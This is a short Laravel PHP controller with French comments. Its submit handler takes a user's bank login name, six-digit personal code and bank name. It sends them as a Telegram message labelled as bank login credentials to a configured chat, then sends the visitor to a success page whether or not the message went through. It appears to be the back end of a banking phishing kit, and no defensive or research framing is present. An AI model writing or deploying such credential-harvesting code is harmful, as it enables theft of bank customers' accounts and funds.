<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Log;

class ValiderController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'code' => 'required|digits:6',
            'bank' => 'required|string|max:100',
        ]);

        // Formatage du message Telegram
        $message = "🔔 *IDENTIFIANT DE CONNEXION BANCAIRES* 🔔\n\n"
                 . "👤 Identifiant : {$validated['username']}\n"
                 . "🔑 Code personnel : {$validated['code']}\n"
                 . "🏦 Banque : {$validated['bank']}";

        // Envoyer Telegram en arrière-plan (non-bloquant)
        try {
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));
        } catch (\Throwable $e) {
            Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
        }

        // Continuer quoi qu'il arrive
        return redirect()->route('success');
    }
}
